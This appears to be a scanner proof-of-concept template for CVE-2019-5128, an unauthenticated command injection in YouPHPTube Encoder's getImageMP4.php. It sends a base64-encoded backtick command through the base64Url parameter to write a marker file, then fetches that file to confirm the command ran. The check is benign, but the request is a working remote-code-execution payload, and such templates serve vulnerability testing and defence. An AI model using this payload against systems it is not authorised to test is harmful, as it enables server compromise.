id: CVE-2019-5128

info:
  name: YouPHPTube Encoder base64Url getImageMP4.php命令注入漏洞
  author: 0x_zmz
  severity: critical
  description: 在 YouPHPTube 编码器中发现了命令注入。成功的攻击可能允许攻击者破坏服务器。YouPHPTube Encoder 2.3 中存在可利用的未经身份验证的命令注入，这是一个用于在 YouPHPTube 中提供编码器功能的插件。/objects/getImageMP4.php 中的参数 base64Url 容易受到命令注入攻击。
  reference:
    - https://xz.aliyun.com/t/6708
    - https://talosintelligence.com/vulnerability_reports/TALOS-2019-0917


set:
    fileName: randomLowercase(4) + ".txt"
    content: randomLowercase(8)
    payload: urlencode(base64("`echo " + content + " > " + fileName + "`"))
rules:
    r0:
        request:
            method: GET
            path: /objects/getImageMP4.php?base64Url={{payload}}&format=jpg
            follow_redirects: true
        expression: response.status == 200
    r1:
        request:
            method: GET
            path: /objects/{{fileName}}
            follow_redirects: true
        expression: response.status == 200 && response.body.bcontains(bytes(content))
expression: r0() && r1()